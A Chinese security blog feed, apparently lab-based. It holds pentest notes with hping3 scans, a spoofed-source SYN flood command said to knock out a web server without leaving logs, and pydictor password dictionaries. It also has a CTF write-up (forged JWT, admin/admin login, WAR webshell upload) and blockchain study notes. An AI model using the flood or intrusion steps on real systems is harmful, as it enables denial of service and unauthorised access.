pan><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ICMP测试"><a href="#ICMP测试" class="headerlink" title="ICMP测试"></a>ICMP测试</h2><p>扫描参数：<strong>hping3 -1 目标 （类似于ping命令）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo hping3 -1 192.168.133.2                                                                                                                                                                          [sudo] password for kali: HPING 192.168.133.2 (eth0 192.168.133.2): icmp mode set, 28 headers + 0 data byteslen&#x3D;46 ip&#x3D;192.168.133.2 ttl&#x3D;128 id&#x3D;3459 icmp_seq&#x3D;0 rtt&#x3D;2.6 mslen&#x3D;46 ip&#x3D;192.168.133.2 ttl&#x3D;128 id&#x3D;3460 icmp_seq&#x3D;1 rtt&#x3D;6.8 mslen&#x3D;46 ip&#x3D;192.168.133.2 ttl&#x3D;128 id&#x3D;3461 icmp_seq&#x3D;2 rtt&#x3D;5.3 mslen&#x3D;46 ip&#x3D;192.168.133.2 ttl&#x3D;128 id&#x3D;3462 icmp_seq&#x3D;3 rtt&#x3D;5.2 mslen&#x3D;46 ip&#x3D;192.168.133.2 ttl&#x3D;128 id&#x3D;3463 icmp_seq&#x3D;4 rtt&#x3D;4.2 mslen&#x3D;46 ip&#x3D;192.168.133.2 ttl&#x3D;128 id&#x3D;3464 icmp_seq&#x3D;5 rtt&#x3D;6.3 ms^C--- 192.168.133.2 hping statistic ---6 packets transmitted, 6 packets received, 0% packet lossround-trip min&#x2F;avg&#x2F;max &#x3D; 2.6&#x2F;5.1&#x2F;6.8 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SYN方式扫描主机端口"><a href="#SYN方式扫描主机端口" class="headerlink" title="SYN方式扫描主机端口"></a>SYN方式扫描主机端口</h2><p>扫描参数：<strong>hping3 –scan 端口范围 -S 目标</strong></p><p>-s选项表示SYN模式</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo hping3 --scan 1-3389 -S  192.168.133.2                                                                                                                                                               Scanning 192.168.133.2 (192.168.133.2), port 1-33893389 ports to scan, use -V to see all the replies+----+-----------+---------+---+-----+-----+-----+|port| serv name |  flags  |ttl| id  | win | len |+----+-----------+---------+---+-----+-----+-----+   53 domain     : .S..A... 128 11278 64240    46All replies received. Done.Not responding ports: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的flags内容为.S..A…暨SYN/ACK</p><h2 id="数据包追踪"><a href="#数据包追踪" class="headerlink" title="数据包追踪"></a>数据包追踪</h2><p>类似于traceroute命令，路由跟踪</p><p>扫描参数：<strong>hping3 –T -V -1</strong> <strong><a href="http://www.baidu.com/">www.baidu.com</a></strong></p><p>-1表示ICMP模式，-T表示路由跟踪，-V详细信息</p><h2 id="进行洪水攻击"><a href="#进行洪水攻击" class="headerlink" title="进行洪水攻击"></a>进行洪水攻击</h2><p>扫描参数：<strong>hping3 -S –flood –rand-source -p 80 目标</strong></p><p>–flood就是要泛洪，–rand-source是为了随机伪造IP源地址，flood attack is a DoS attack.</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo hping3 -S --flood --rand-source -p 80 172.31.62.250                                                                                                                                                   HPING 172.31.62.250 (eth0 172.31.62.250): S set, 40 headers + 0 data byteshping in flood mode, no replies will be shown^C--- 172.31.62.250 hping statistic ---4232679 packets transmitted, 0 packets received, 100% packet lossround-trip min&#x2F;avg&#x2F;max &#x3D; 0.0&#x2F;0.0&#x2F;0.0 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到我们在进行dos的过程中发送了4232679个数据包。我在进行dos攻击的时候，由于是半连接攻击，确实实现了对web服务器的dos攻击，并且事后查看web服务器nginx的access日志也不会有任何记录。这也是SYN探测的优点，半连接未建立完全连接，所以apache或nginx的日志文件中不会进行记录。</p><h1 id="Pydictor"><a href="#Pydictor" class="headerlink" title="Pydictor"></a>Pydictor</h1><p>pydictor 是一个强大实用的黑客暴力破解字典建立工具</p><p>GitHub项目首页：<a href="https://github.com/LandGrey/pydictor/">https://github.com/LandGrey/pydictor/</a></p><p>官方手册语法：<a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md">https://github.com/LandGrey/pydictor/blob/master/README_CN.md</a></p><p>详细使用方法：python3 pydictor.py -h</p><p><strong>常见的字典生成模式：</strong></p><h2 id="生成纯数字字典"><a href="#生成纯数字字典" class="headerlink" title="生成纯数字字典"></a>生成纯数字字典</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 pydictor.py -base d --len 1 6    # 生成1-6位纯数字密码字典python3 pydictor.py -base d --len 6 6    # 生成6位纯数字密码字典┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;InfoCollect&#x2F;pydictor]└─$ .&#x2F;pydictor.py -base d  --len 1 6                                                                         [+] A total of :1111110 lines[+] Store in   :&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;InfoCollect&#x2F;pydictor&#x2F;results&#x2F;base_001117.txt [+] Cost       :3.7301 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20211104121352065.png" alt="image-20211104121352065"></p><h2 id="生成数字-字母字典"><a href="#生成数字-字母字典" class="headerlink" title="生成数字+字母字典"></a>生成数字+字母字典</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 pydictor.py -base dL --len 1 3    # 生成1-3位数字小写字母混合密码# 你还可以自行进行搭配和组合，相关选项的参数你-h都可以查看到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="根据社会工程学生成字典"><a href="#根据社会工程学生成字典" class="headerlink" title="根据社会工程学生成字典"></a>根据社会工程学生成字典</h2><p>这个东西还是挺不错的，里面提供的选项也很多，你可以根据你各种手段收集到的个人信息来生成这样的一个社会工程学字典。</p><pre class="line-numbers language-none"><code class="language-none">python3 pydictor.py --sedbpydictor SEDB&gt;&gt;set cname Alicecname      :Alicepydictor SEDB&gt;&gt;set phone 9089875phone      :9089875pydictor SEDB&gt;&gt;set email alice@alice.comemail      :alice@alice.compydictor SEDB&gt;&gt;run[+] A total of :3190 lines[+] Store in   :&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;InfoCollect&#x2F;pydictor&#x2F;results&#x2F;sedb_002345.txt [+] Cost       :0.1178 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://mp.weixin.qq.com/s/_9qMu-CUKTTMAVCSZMBzUA">https://mp.weixin.qq.com/s/_9qMu-CUKTTMAVCSZMBzUA</a></li><li><a href="https://mp.weixin.qq.com/s/nmVIXDYf78WZye7GDFzD0g">https://mp.weixin.qq.com/s/nmVIXDYf78WZye7GDFzD0g</a></li><li><a href="https://mp.weixin.qq.com/s/0xDAS4I1LUwg6EknROcqVg">https://mp.weixin.qq.com/s/0xDAS4I1LUwg6EknROcqVg</a></li><li><a href="https://mp.weixin.qq.com/s/G1rBIzNGb0SqVDGQtTIOAg">https://mp.weixin.qq.com/s/G1rBIzNGb0SqVDGQtTIOAg</a></li><li><a href="https://mp.weixin.qq.com/s/H0lEiU21jdjg6aAEeHQN3g">https://mp.weixin.qq.com/s/H0lEiU21jdjg6aAEeHQN3g</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透测试第一步，就是信息收集。信息收集很大程度为后续工作打下基础。针对目标资产和主机进行信息收集是必不可少的的部分，也是至关重要的部分。&lt;/</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="http://yoursite.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>长安杯2021高校组WEB部分</title>
    <link href="http://yoursite.com/post/%E9%95%BF%E5%AE%89%E6%9D%AF2021%E9%AB%98%E6%A0%A1%E7%BB%84WEB%E9%83%A8%E5%88%86.html"/>
    <id>http://yoursite.com/post/%E9%95%BF%E5%AE%89%E6%9D%AF2021%E9%AB%98%E6%A0%A1%E7%BB%84WEB%E9%83%A8%E5%88%86.html</id>
    <published>2021-10-01T11:31:54.000Z</published>
    <updated>2021-10-01T11:37:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EzPy"><a href="#EzPy" class="headerlink" title="EzPy"></a>EzPy</h1><p>jwtcrack进行secret爆破， 密钥：CTf4r</p><p>伪造token</p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJwYXNzd2QiOiJhZG1pbiIsInVpZCI6ImNmNTVhOGI0LWE1ZTEtNGQyYS04YzNkLWNkZDdlNjI1MDUwNSIsInJvbGUiOiJhZG1pbiJ9.4yZ_LgU1jIj3Ov7mXn_kFUnCv5M2i6yajzh2uaXqDl4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已经利用到了eval函数了，但是不知道如何去执行代码，求一个WP</p><h1 id="asuka"><a href="#asuka" class="headerlink" title="asuka"></a>asuka</h1><p>弱口令登录后台admin/admin</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master//img/202110011930275.png" alt="image-20210925165637024"></p><p>上传打包好的war文件，内含webshelll</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master//img/202110011930814.png" alt="image-20210925165710691"></p><p>冰蝎连接即可</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master//img/202110011932019.png" alt="image-20210925163754622"></p><h1 id="Old-But-A-Little-New"><a href="#Old-But-A-Little-New" class="headerlink" title="Old But A Little New"></a>Old But A Little New</h1><p>弱口令登录后台admin/admin</p><p>和上一题一样操作。估计是主办方题目出问题了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;EzPy&quot;&gt;&lt;a href=&quot;#EzPy&quot; class=&quot;headerlink&quot; title=&quot;EzPy&quot;&gt;&lt;/a&gt;EzPy&lt;/h1&gt;&lt;p&gt;jwtcrack进行secret爆破， 密钥：CTf4r&lt;/p&gt;
&lt;p&gt;伪造token&lt;/p&gt;
&lt;pre class=&quot;li</summary>
      
    
    
    
    <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>读《区块链技术与应用》小记</title>
    <link href="http://yoursite.com/post/%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B%E5%B0%8F%E8%AE%B0.html"/>
    <id>http://yoursite.com/post/%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E3%80%8B%E5%B0%8F%E8%AE%B0.html</id>
    <published>2021-09-28T07:53:21.000Z</published>
    <updated>2021-09-28T12:55:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近期，开始学习区块链的相关知识了，手头上搞到了一本华为区块链技术开发团队编写的《区块链技术及应用》来简单的系统化入门和了解区块链。并将一些我阅读中的心得或者说是觉得重要之处记录于此，一些概念性的东西可以自行Google。</p><h1 id="区块链技术之基础"><a href="#区块链技术之基础" class="headerlink" title="区块链技术之基础"></a>区块链技术之基础</h1><h2 id="哈希运算"><a href="#哈希运算" class="headerlink" title="哈希运算"></a>哈希运算</h2><p>区块链账本数据主要是通过父区块的哈希值组成的链式数据结构。以此保证其不可篡改性。在区块链中常用SHA-256算法来进行hash运算。</p><p><strong>hash运算之特性：</strong></p><ul><li>正向快速（计算速度快）</li><li>输入敏感（雪崩效应）</li><li>逆向困难（难以逆推）</li><li>强抗碰撞性（碰撞概率很小，相对而言即暴力枚举成本极高）</li></ul><p>链式结构设计很巧妙，每一个区块主要包括了父区块哈希值、时间错、默克尔树根等信息，其中父区块哈希值十分关键了，如果某一个区块被篡改，将会导致该区块hash发生改变，从而与子区块中记录的父区块hash值不符合，导致区块链断裂。而如果要篡改，那可能需要将篡改区块后的所有区块的父区块hash全改一遍，这个工作量是十分巨大的，而且每10分钟甚至更短时间就会打包一个新区块。故而说区块链技术具有防篡改性，因为篡改成本高到可怕。</p><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是用于验证身份的，区块链中主要用来实现权限控制，识别交易发起者的合法身份，防止恶意节点身份冒充。</p><p><strong>签名之原理：</strong></p><p>发送方A对原始数据先进行hash计算得到一个数字摘要，使用非对称密钥对中的私钥对数字摘要进行加密，这个加密后的数据就是数字签名。</p><p><strong>验证签名的过程：</strong></p><p>接收方B使用发送方A的非对称加密的公钥来对数字签名进行解密，得到原始数据的hash值，然后再通过对A的原始数据进行相同的hash运算得到一个数字摘要，然后对比解密签名得到的hash和原始数据计算得到的比较，如果一致，则签名验证通过。</p><h2 id="共识算法"><a href="#共识算法" class="headerlink" title="共识算法"></a>共识算法</h2><p>PoW、Po*、拜占庭容错算法、结合可信执行环境的共识算法。</p><p>其中<strong>PoW是最常见的算法</strong>，bitcoin使用的就是PoW，但是这个共识算法也有不好的地方，过于消耗能源，造成大量能源浪费。所以也产生了一些针对这个问题，而改进的一些应用币种，例如质数币，利用挖矿过程中的大量浪费能源来为科研做出一点点贡献。但是这种模式实在是太过于浪费能源了。</p><p><strong>Po*引入了凭证的概念</strong>，会根据每个节点的某些属性来定义出块难度和优先级，从而一定程度上减少开销和能源消耗，但是问题是它具有中心化趋势，与区块链的理念相悖，而且这样做的话明显会使得矿工激励不足，使得节点缺乏参与动力。</p><p><strong>拜占庭容错算法则是类似于选举出leader来负责出块，然后leader也可能被推翻</strong>，这种算法不适用于节点大量的系统，因为节点之间的这个选举和协商过程会有很大的开销，因为它是有可能经常出现选举新leader和推翻旧leader的情况出现的。</p><p><strong>结合可信执行环境，很明显了首先就是要有可信执行环境才行，</strong>需要软硬件结合，这个我觉得还是很难实现的，区块链中往往节点的安全性和性能是参差不齐的，有的节点可能就是安全性低和很脆弱的。故而可信执行环境这个点要想实现很难，不可能区块链节点都拥有这样的可信执行环境。</p><h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>智能合约早在1995年就被Nick Szabo提出了，这东西就是个合同，只不过他是由脚本自动化执行的电子合同，它没有一个中间人来执行条款，而是100%由计算机代码来执行。所以他就是触发某个条件就会去自动执行的自动化脚本。基于区块链的智能合约需要包括事务处理机制、数据存储机制以及完备的状态机。触发条件就是if，预置条件就是if语句中执行的代码。具体内容可以去学习以太坊的智能合约。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master//img/QQ%E5%9B%BE%E7%89%8720210928193129.jpg" alt="QQ图片20210928193129"></p><p>智能合约往往是由程序员来进行编写的，它经常出现的问题是逻辑问题，当然也可能是程序员使用了一些不确定性的指令，导致系统出现奇异，影响系统的一致性。目前区块链平台也都引入了一些改进机制来消除不确定性，例如以太坊就要求使用其专用的solidity语言来进行区块链的开发工作，以此来保证智能合约执行动作的一致性。</p><h2 id="P2P网络"><a href="#P2P网络" class="headerlink" title="P2P网络"></a>P2P网络</h2><p>pear to pear网络是区别于传统C/S网络的，传统的C/S网络是需要一个中心服务器的，客户端之间的通讯是依赖于中心服务其的转发，所以中心服务器就成为影响整个网络的关键因素，这就是中心化问题了。而Pear to Pear网络是对等网络，所有的设备之间是地位对等的，所以这样就没有中心服务器了，去中心化的特点就是及时某些节点损坏也不影响网络整体上的通讯。</p><p>而区块链正是需要这样的一个去中心化的分布式通讯需求，所以P2P成为了区块链通讯采用的方式就顺理成章了，毕竟如果区块链使用的是C/S网络的话，中心服务器将会承受极其巨大的压力。</p><h1 id="区块链的特性"><a href="#区块链的特性" class="headerlink" title="区块链的特性"></a>区块链的特性</h1><h2 id="透明可信"><a href="#透明可信" class="headerlink" title="透明可信"></a>透明可信</h2><p>区块链系统设计成一个去中心化的分布式系统，使用了P2P网络来作为基础的通讯网络结构，每一个节点都是地位上对等的，所以这也让信息是透明的，不会出现所谓信息不对等，中心节点成为一个黑盒，其他节点无法知道所有信息。记账过程也是每个节点都记账即都参与，从而保证账本的可信性。故透明可信。</p><h2 id="防篡改可追溯"><a href="#防篡改可追溯" class="headerlink" title="防篡改可追溯"></a>防篡改可追溯</h2><p>所谓防篡改，这个就是前面说到的了。区块链系统设计成链式结构，而且每一个区块和父区块hash都有关系，故而要篡改区块信息成本是十分巨大的，只有控制操作51%的算力才能实现。防篡改并非不能被篡改，只不过要篡改需要付出巨大代价，当代价足够大就使得篡改是件吃力不讨好的事，自然使得具有了一定的防篡改性。而可追溯也得益于防篡改了，真是因为防篡改，所以使得记录可信，故而追溯得以实现，否则溯源记录可信度低，其意义不大。</p><h2 id="隐私安全保障"><a href="#隐私安全保障" class="headerlink" title="隐私安全保障"></a>隐私安全保障</h2><p>区块链系统中的用户已私钥作为唯一标识，而且其去中心化决定了其的“去信任”特性，区块链只关注私钥参与区块链上的各类交易，而不关注私钥由何人持有。对于区块链而言，其只能知道一个持有某个私钥的人进行了交易，而无法知道持有私钥的人到底是谁，这也保护了交易者的信息。所以啊私钥一定要保护好啊！</p><h2 id="系统高可靠"><a href="#系统高可靠" class="headerlink" title="系统高可靠"></a>系统高可靠</h2><p>因为区块链系统的对等网络特性，使得即使有部分节点奔溃，依旧可以保证网络的可靠性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;近期，开始学习区块链的相关知识了，手头上搞到了一本华为区块链技术开发团队编写的《区块链技术及应用》来简单的系统化入门和了解区块链。并将一些我</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="区块链" scheme="http://yoursite.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Blockchain Security入门笔记</title>
    <link href="http://yoursite.com/post/Blockchain-Security%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0.html"/>
    <id>http://yoursite.com/post/Blockchain-Security%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0.html</id>
    <published>2021-08-24T15:49:18.000Z</published>
    <updated>2021-09-23T10:45:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>Blockchain入门必须从相关名词开始入手。</p><h1 id="钱包Wallet"><a href="#钱包Wallet" class="headerlink" title="钱包Wallet"></a>钱包Wallet</h1><p>Wallet是一个管理私钥的工具，通常包含一个软件客户端，允许使用者通过钱包检查、存储、交易持有的数字货币。这是一个重要的设施和入口。关于钱包的攻击主要集中再钓鱼和第三方hijack，这意味着钱包持有者需要提高安全意识。</p><h1 id="冷钱包Cold-Wallet"><a href="#冷钱包Cold-Wallet" class="headerlink" title="冷钱包Cold Wallet"></a>冷钱包Cold Wallet</h1><p>cold wallet是一种脱离网络连接的离线钱包，将数字货币进行离线存储的钱包。使用者生成数字货币地址和私钥保存在冷钱包而无需网络支持，因此cold wallet的私钥不容易被hacker获取，但是也存在安全风险，例如random number不安全、hardware损坏与丢失等等。而最重要的东西还是那个<strong>私钥</strong>，必须要保护好私钥的安全。</p><h1 id="热钱包Hot-Wallet"><a href="#热钱包Hot-Wallet" class="headerlink" title="热钱包Hot Wallet"></a>热钱包Hot Wallet</h1><p>这个很明显就是Cold Wallet的反义了，所以Hot Wallet自然就是需要网络的在线钱包。但是在线钱包带来便利的同时也带来了更多的安全风险，例如钓鱼网站盗取钱包文件，泄露钱包密码，或者私钥被破解等的问题。注意：中心化管理钱包并非绝对安全，最好在不同平台设置不同的密码，启用二次认证，提升安全性。</p><h1 id="公钥Public-Key"><a href="#公钥Public-Key" class="headerlink" title="公钥Public Key"></a>公钥Public Key</h1><p>Public Key是与私钥成对出现的，这个和非对称加密的公私密钥类似吧。Public Key与Private Key组成了一个密钥对，公钥由私钥生成，无法逆推私钥。公钥能够通过一系列算法运算得到钱包的地址，因此能够作为拥有这个钱包地址的凭证。</p><h1 id="私钥Private-Key"><a href="#私钥Private-Key" class="headerlink" title="私钥Private Key"></a>私钥Private Key</h1><p>Private Key是一串由随机算法生成的数据，它可以通过非对称加密算法算出公钥，公钥可以再算出币的地址。<strong>私钥是非常重要的</strong>，区块链资产实际在区块链上，所有者实际只拥有私钥，私钥代表了你对区块链资产的绝对控制权，因此，区块链资产安全问题的核心问题应该在于私钥的存储上。</p><p>public key和private key实际上就是利用了非对称加密算法带来的好处，提升了数据的安全性。私钥加密再由公钥解密，和传统的账号和密码形式相比安全性提高了数据传输的安全性和完整性。</p><h1 id="助记词Mnemonic"><a href="#助记词Mnemonic" class="headerlink" title="助记词Mnemonic"></a>助记词Mnemonic</h1><p>由于私钥是一长串毫无意义的字符，难以记忆，故而出现了mnemonic，就像IP地址难以记忆，故而出现了domain一样。mnemonic是利用固定算法来将私钥转换为十多个常见的英文单词，以便于记忆。所以<strong>助记词与私钥是直接关联，可以互相转换</strong>，故而助记词也需要如private key一样保护。而且助记词是明文性的，更要注意，避免泄露。最安全的保存方式自然是物理方式，电子文档还是存在更大泄露风险。</p><h1 id="Keystore"><a href="#Keystore" class="headerlink" title="Keystore"></a>Keystore</h1><p>Keystore主要在以太坊wallet中较为常见，它是把<strong>私钥通过钱包密码再加密</strong>来的，与助记词不同。私钥通过钱包密码再加密得来的，与助记词不同，一般可保存为文本或 JSON 格式存储。换句话说， Keystore 需要用钱包密码解密后才等同于私钥。这意味着原本私钥的安全性问题就间接变为wallet密码的安全问题，如果wallet密码强度不高，那么可能导致private key也会不安全。存在暴力破解wallet password然后结合盗取的keystore解密出私钥的风险。故而keystore使用后，需要加强对wallet密码的保护，提高wallet密码强度。</p><p>备份、备份还是备份，区块链数字钱包的私钥、助记词、keystore都要注意备份，采取多重、多次备份来减少因为这三者丢失照成的风险。</p><h1 id="imToken钱包安全“十不原则”"><a href="#imToken钱包安全“十不原则”" class="headerlink" title="imToken钱包安全“十不原则”"></a>imToken钱包安全“十不原则”</h1><ol><li>不使用未备份的钱包 </li><li>不使用邮件传输或存储私钥 </li><li>不使用微信收藏或云备份存储私钥</li><li>不要截屏或拍照保存私钥 </li><li>不使用微信、QQ 传输私钥</li><li>不要将私钥告诉身边的人</li><li>不要将私钥发送到群里</li><li>不使用第三方提供的未知来源钱包应用</li><li>不使用他人提供的 Apple ID</li><li>不要将私钥导入未知的第三方网站</li></ol><h1 id="公链Public-Blockchain"><a href="#公链Public-Blockchain" class="headerlink" title="公链Public Blockchain"></a>公链Public Blockchain</h1><p>Public Blockchain即公有链，是全球所有人都可以随时进入读取、交易、确认的共识Blockchain。公有链通常认为是完全去中心化的，链上的数据都是公开透明的，不可更改，任何人都可以通过交易或挖矿读取和写入数据。</p><p>一般通过代币机制（Token）来鼓励参与者竞争记账，来确保数据的安全性。无法检测所有公链。因为检测所有的公链的工作量非常大，只依靠一家企业不可能实现全体区块链生态安全监控，这就导致hacker能够转空子在众多公链中寻找可利用漏洞发起攻击。</p><p>公链被黑已经累计损失5200W US Dollars</p><p><img src="https://files.catbox.moe/5b3skx.png" alt="图片来自慢雾安全"></p><h1 id="交易所Exchange"><a href="#交易所Exchange" class="headerlink" title="交易所Exchange"></a>交易所Exchange</h1><p>区块链交易所就是类似证券交易所类似的功能，只不过这里的交易所是数字货币买卖交易的平台。数字货币交易所又分为<strong>中心化交易所</strong>和<strong>去中心化交易所</strong>。</p><h2 id="去中心化交易所"><a href="#去中心化交易所" class="headerlink" title="去中心化交易所"></a>去中心化交易所</h2><p>交易行为直接发生在区块链上，数字货币会直接发回使用者的钱包，或是保存在区块链上的智能合约。这种设计的好处在于交易所不会持有用户大量的数字货币，所有的数字货币都存储在用户钱包或者平台的智能合约上。信任层面去中心化了，交易所的信任问题就被解决了，每笔交易都是在区块链上公开透明，交易所不用保管用户资产和私钥，这样用户资产完全由用户自己控制，提高了个人数据安全性和隐私性。常见去中心化交易所有WhaleEx、Bancor、dYdX等。</p><p>去中心化交易所只是一个交易平台，而不直接经手用户资产和私钥，用户实际上只直接进行了交易，对公共链进行修改。</p><h2 id="中心化交易所"><a href="#中心化交易所" class="headerlink" title="中心化交易所"></a>中心化交易所</h2><p>目前热门交易所多是采用了中心化技术的交易所，使用者需要在平台上注册，并经过一系列身份认证KYC后，才能在平台上进行数字货币的交易。<br>所谓中心化交易所，我感觉类似是区块链世界中的银行，这个银行中存储了大量的数字货币，然后用户们的交易也是在这个拥有大量数字货币的银行中进行的。这种交易并没有影响到外部的公共区块链，这只是内部的数字货币所有者变动而已，对于外部来说应当是不公开透明的。相当于交易所维护一个内部数据库，来控制不同用户资产，同时及时提供提款服务保障即可。对外这个拥有大量用户的数字资产的交易所才是一个区块链用户。这样似乎是能够减少对公链的频繁修改。</p><p>但是bank是一种存储了大量财富的地方，那肯定有人会打它的主意，而中心化Exchange就是这样的一个资产聚集地，自然也成了hackers的重要目标。常见中心化交易所币安、火币、OKEx等</p><p><img src="https://ftp.bmp.ovh/imgs/2021/09/a94253871e609d6d.png" alt="图片来自雾慢安全区块链被黑档案"></p><p>截止现在交易所被黑导致的损失达到了64多亿US Dollars</p><h1 id="节点Node"><a href="#节点Node" class="headerlink" title="节点Node"></a>节点Node</h1><p>在传统互联网中，数据是集中存放的，即所谓中心化问题，使用中心化的服务器来存储数据，它存在的最大危机就是，如果这个中心出现故障，那就意味着大家都无法使用。所以分布式数据库出现了，而区块链就是去中心化的分布式数据库，由千万个小“服务器”构成的巨大网络。</p><p>区块链网络中的每一个节点就是存储所有区块数据的每一台电脑或服务器。新区快的产生、交易验证、广播同步都是由节点来完成。Node也可以细分为全节点和轻节点。</p><p>全节点：拥有全网所有的交易数据的节点</p><p>轻节点：只拥有和自己相关的交易数据节点</p><p>而分布式就体现在每一个全节点都会保存全网所有交易数据，相当于是在这个区块链网络中对交易数据有多重备份，即使某个节点down掉了，整个网络依旧可以正常运作。</p><h1 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h1><p>RPC是Remote Procedure Call，远程过程调用的缩写，这是一个计算机通讯协议。</p><p>以太坊 RPC 接口是以太坊节点与其他系统交互的窗口，以太坊提供了各种 RPC 调用：HTTP、IPC、WebSocket 等等。在 以太坊源码中，server.go 是核心逻辑，负责 API 服务的注入，以及请求处理、返回。http.go 实现 HTTP 的调用，websocket.go 实现 WebSocket 的调用，ipc.go 实现 IPC 的调用。以太坊节点默认在 8545 端口提供了 JSON RPC 接口，数据传输采用 JSON 格式，可以执行 Web3 库的各种命令，可以 向前端（例如 imToken、Mist 等钱包客户端）提供区块链上的信息</p><p>关于RPC攻击的经典案例是<strong>以太坊黑色情人节漏洞</strong>，攻击者利用以太坊节点Geth/Parity RPC API鉴权缺陷，恶意调用eth_sendTransaction盗取代币，持续两年，造成巨大资产损失。</p><h1 id="共识Consensus"><a href="#共识Consensus" class="headerlink" title="共识Consensus"></a>共识Consensus</h1><p>共识算法主要是解决分布式系统中多节点之间对某个状态达成一致性结果的问题。分布式系统给由于具有多个服务节点共同完成你事物处理，所以对整个分布式系统而言，它在对外是应当要保持数据状态的一致性。但是现实问题是，由于节点的不可靠性和通讯的不稳定性，甚至节点作恶伪造数据等因素的存在，节点之间可能就会出现数据状态的不一致性，所以我们需要引入一个机制来进行协调，让数据状态一致化，这就是共识算法了。</p><p>将不可靠的节点组建成一个可靠的分布式系统，从而提高系统可靠性，数据状态的一致性。</p><p>区块链系统本身作为一个超大规模的分布式系统，但又与传统的分布式系统存在明显区别。由于它不依赖于任何一个中央权威，系统建立在去中心化的点对点网络基础之上，因此分散的节点需要就交易的有效与否达成一致，这就是共识算法发挥作用的地方，即确保所有节点都遵守协议规则并保证所有 交易都以可靠的方式进行。由共识算法实现在分散的节点间对交易的处理顺序达成一致，这是共识算法在区块链系统中起到的最主要作用。</p><p><strong>共识算法本质上就是在解决分布式系统如何保持一致性的问题</strong></p><h2 id="工作量证明PoW"><a href="#工作量证明PoW" class="headerlink" title="工作量证明PoW"></a>工作量证明PoW</h2><p>PoW（proof of work）是历史上第一个成功去中心化区块链共识算法，被比特币、以太坊，莱特币等主流公链广泛使用。</p><p>工作量证明要求节点参与者<strong>执行计算密集型的任务</strong>，但是对于其他网络参与者来说易于验证。在比特币的例子中，矿工竞相向由整个网络维护的区块链账本中添加所收集到的交易，即区块。为了做到这 